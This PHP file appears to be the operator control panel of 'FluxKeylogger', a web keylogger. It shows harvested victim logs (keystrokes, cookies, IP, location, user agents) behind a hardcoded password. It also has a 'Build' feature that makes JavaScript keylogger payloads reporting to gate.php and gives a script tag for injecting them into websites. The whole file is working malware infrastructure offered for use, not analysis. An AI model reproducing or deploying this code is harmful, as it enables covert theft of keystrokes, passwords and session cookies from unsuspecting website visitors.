<?php
   session_start();
   function showPageContent()
   {
       // Verifica se o usuário já está logado
       if (isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true) {  ?>
<!DOCTYPE html>
<html>
   <head>
      <title>FluxKeylogger - Control</title>
      <meta charset="utf-8">
      <link rel="icon" type="image/png" href="http://icons.iconarchive.com/icons/hopstarter/malware/128/Infect-icon.png"/>
      <script src="https://code.jquery.com/jquery-3.4.1.min.js"></script>
      <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" rel="stylesheet">
      <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js"></script>
      <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.bundle.min.js"></script>
      <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
      <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
      <link href="https://fonts.googleapis.com/css?family=Ubuntu&display=swap" rel="stylesheet">
   </head>
   <body style="background-color: #111111;">
      <?php
         // Get dirs
         function get_dirs($dir = '') {
         	return array_filter(glob('logs/' . $dir . '*'), 'is_dir');
         }
         // Get log files in dir
         function get_files($dir = '') {
         	return array_filter(glob($dir . '*.log'), 'is_file');
         }
         	?>
      <style type="text/css">
         .i {
         position: relative;
         top: 5px;
         }
         .sinfo:hover {
         color: #9999ff;
         cursor: pointer;
         }
         .skeylogs:hover {
         color: #ff8000;
         cursor: pointer;
         }
         .rlogs:hover {
         color: #ff4d4d;
         cursor: pointer;
         }
      </style>
      <script type="text/javascript">
         // Read info
         function read_log(ip, location, host, uagents, cookies, date, time, name) {
           swal(
             "Information",
             "\nName: " + name +
             "\nRemote IP: " + ip +
             "\nHost: " + host +
             "\nLocation: " + location +
             "\nUserAgents: " + uagents +
             "\nCookies: " + cookies +
             "\nDate: " + date +
             "\nTime: " + time,
             "info"
           );
         }
         // Read keyboard
         function read_keyboard(keys) {
           swal(
             "Key logs",
             keys,
             "info"
           );
         }
         // Remove log file
         function remove_log(log, row) {
           swal({
             title: "Are you sure?",
             text: "Delete log file?\n" + log,
             icon: "warning",
             buttons: true
           }).then((result) => {
             if (result) {
               // Delete file
               var http = new XMLHttpRequest();
               var params = "logfile=" + log + "&cleanLogs";
               http.open("POST", "gate.php", true);
               http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
               http.send(params);
               // Message
               swal(
                 "Deleted!",
                 "Your file has been deleted.",
                 "success"
               );
               // Hide
               $(row).parent().parent().hide(1000);
             }
           });
         }
         // Build
         function buildCreate() {
           var name = $("#buildName");
           var gate = $("#buildGate");
           // Request to build.php
           var http = new XMLHttpRequest();
           var params = "buildName=" + name.val() + "&buildGate=" + gate.val() + "&buildFlux";
           var buildLocation = document.location["href"].replace("flux.php", "") + "builds/" + name.val() + ".js";
           http.open("POST", "build.php", true);
           http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
           http.send(params);
           // Message
           swal(
             "Build created!",
             "Build location:\nURL: " + buildLocation + "\nTAG: <script src='" + buildLocation + "'><\/script>",
             "success"
           );
           // New name
           name.val(Math.floor((Math.random() * 999999) + 0));
         }
         // Search in table
         $(document).ready(function(){
           $("#logsSearch").on("keyup", function() {
             var value = $(this).val().toLowerCase();
             $("#logsTable tr").filter(function() {
               $(this).toggle($(this).text().toLowerCase().indexOf(value) > -1);
             });
           });
         });
      </script>
      <!-- NAVBAR -->
      <nav class="navbar navbar-expand-xl navbar-dark bg-dark">
         <a style="font-family: 'Ubuntu', sans-serif;" class="navbar-brand" href="#"> <i class="i material-icons">remove_red_eye</i> Flux</a>
         <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarToggle" aria-controls="navbarToggle" aria-expanded="true" aria-label="Toggle navigation">
         <span class="navbar-toggler-icon"></span>
         </button>
         <div class="navbar-collapse collapse show" id="navbarToggle" style="">
            <ul class="navbar-nav mr-auto">
               <li class="nav-item">
                  <a style="font-family: 'Ubuntu', sans-serif;" class="nav-link" href="#" data-toggle="modal" data-target="#buildModal"> <i class="i material-icons">build</i> Build</a>
               </li>
               <li class="nav-item">
                  <a style="font-family: 'Ubuntu', sans-serif;" class="nav-link" target="_blank" href="https://github.com/benzetaa/Flux-Keylogger"> <i class="i material-icons">unarchive</i> Github</a>
               </li>
            </ul>
            <form class="form-inline my-2 my-md-0">
               <div class="input-group-prepend">
                  <div class="input-group-prepend">
                     <div class="input-group-text"><i class="material-icons">search</i></div>
                  </div>
                  <input class="form-control" type="text" id="logsSearch" placeholder="Search">
               </div>
            </form>
         </div>
      </nav>
      <!-- BUILD -->
      <div style="font-family: 'Ubuntu', sans-serif;" class="modal fade" id="buildModal" role="dialog" aria-labelledby="buildModalLabel" aria-hidden="true">
         <div class="modal-dialog" role="document">
            <div class="modal-content">
               <div class="modal-header">
                  <h5 class="modal-title" id="buildModalLabel">Create keylogger</h5>
                  <button type="button" class="close" data-dismiss="modal" aria-label="Close">
                  <span aria-hidden="true">&times;</span>
                  </button>
               </div>
               <div class="modal-body">
                  <br> <i class="material-icons">description</i> Name:<br>
                  <input id="buildName" type="text" value="<?php echo rand(0, 99999999999999);?>" class="form-control" placeholder="Name of keylogger" title="Enter name here">
                  <br> <i class="material-icons">settings_remote </i> Gate:<br>
                  <input id="buildGate" type="text" value="<?php echo (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http') . '://' . $_SERVER['HTTP_HOST'] . str_replace('flux.php', '', $_SERVER['REQUEST_URI']) . 'gate.php'; ?>" class="form-control" placeholder="gate.php location" title="Enter gate.php location here">
               </div>
               <div class="modal-footer">
                  <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
                  <button type="button" class="btn btn-primary" onclick="buildCreate();">Create</button>
               </div>
            </div>
         </div>
      </div>
      <!-- TABLE -->
      <table class="table table-dark table-hover" id="logsTable" style="margin-top: 1%;">
         <thead>
            <tr style="font-family: 'Ubuntu', sans-serif;">
               <th scope="col"> <i class="i material-icons">router</i> Host</th>
               <th scope="col"> <i class="i material-icons">gps_fixed</i> Remote IP</th>
               <th scope="col"> <i class="i material-icons">date_range</i> Date</th>
               <th scope="col"> <i class="i material-icons">settings</i> Settings</th>
            </tr>
         </thead>
         <tbody>
            <?php
               // Get logs
               foreach (get_dirs() as $ip_dir) {
                   foreach (get_dirs(explode("/", $ip_dir)[1] . '/') as $date_dir) {
                       foreach (get_files($date_dir . '/') as $log_file) {
                           $remote_log = explode("/", $log_file)[3];
                           $i = json_decode(file_get_contents($log_file), true);
                           // Get log data
                           $remote_ip  = $i["remote_ip"];
                           $location   = $i["location"];
                           $uagents    = $i["uagents"];
                           $cookies    = $i["cookies"];
                           $keylogs    = $i["keyLogs"];
                           $name       = $i["name"];
                           $host       = $i["host"];
                           $date       = $i["date"];
                           $time       = $i["time"];
               
                           // Remove "<shift>" from keylogs
                           $keylogs = str_replace(" <Shift> ", '', $keylogs);
                           // Replace "<tab>" with a line break
                           $keylogs = str_replace("<TAB>", '\n', $keylogs);
               
                           echo "
                           <tr>
                               <td><a style='color: white;' href='http://$host'>$host</a></td>
                               <td>$remote_ip</td>
                               <td>$date</td>
                               <td>
                                   <i title='Show information' class='sinfo material-icons' onclick=\"read_log('$remote_ip', '$location', '$host', '$uagents', '$cookies', '$date', '$time', '$name');\">credit_card</i>
                                   <i title='Show keylogs' class='skeylogs material-icons' onclick=\"read_keyboard('$keylogs');\">keyboard</i>
                                   <i title='Remove log' class='rlogs material-icons' onclick=\"remove_log('$log_file', this);\">delete_forever</i>
                               </td>
                           </tr>";
                       }
                   }
               }
               
               ?>
         </tbody>
      </table>
   </body>
</html>
<?php } else {
   $PASSSWORD = "senha";
         // Usuário não logado, verificar a senha
         if (isset($_POST['senha']) && $_POST['senha'] === $PASSSWORD) {
             // Senha correta, definir sessão e redirecionar para a página logada
             $_SESSION['logged_in'] = true;
             $_SESSION['expiry_time'] = time() + (5 * 60); // 5 minutos de expiração
             header('Location: ' . $_SERVER['PHP_SELF']);
             exit;
         } else {
             // Senha incorreta ou não enviada, mostrar o campo de senha
             echo '<form method="post">';
             echo '  <label for="senha">Password:</label>';
             echo '  <input type="password" name="senha" id="senha">';
             echo '  <input type="submit" value="Entrar">';
             echo '</form>';
         }
     }
   }
   
   // Verificar se a sessão expirou
   if (isset($_SESSION['expiry_time']) && $_SESSION['expiry_time'] < time()) {
     // Sessão expirada, destruir sessão e redirecionar para a página de login
     session_unset();
     session_destroy();
     header('Location: ' . $_SERVER['PHP_SELF']);
     exit;
   }
   
   // Chama a função para exibir o conteúdo da página
   showPageContent();
   ?>